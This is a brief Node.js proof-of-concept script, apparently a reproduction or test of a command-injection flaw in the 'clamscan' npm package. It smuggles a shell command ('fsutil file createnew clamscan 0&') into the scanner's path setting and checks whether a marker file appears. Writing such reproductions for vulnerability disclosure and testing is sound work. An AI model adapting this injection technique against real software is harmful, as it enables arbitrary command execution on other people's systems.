var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const Root = require('clamscan');
const fs = require('fs');
const path = './clamscan';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
var attack_code = 'fsutil file createnew clamscan 0';
var root = new Root();
fs.mkdir(attack_code + '&', function () {
});
console.log(root.init({ clamscan: { path: attack_code + '&' } }).then(() => {
}).catch(err => {
}).finally(() => {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlink(path, function (err) {
    });
}));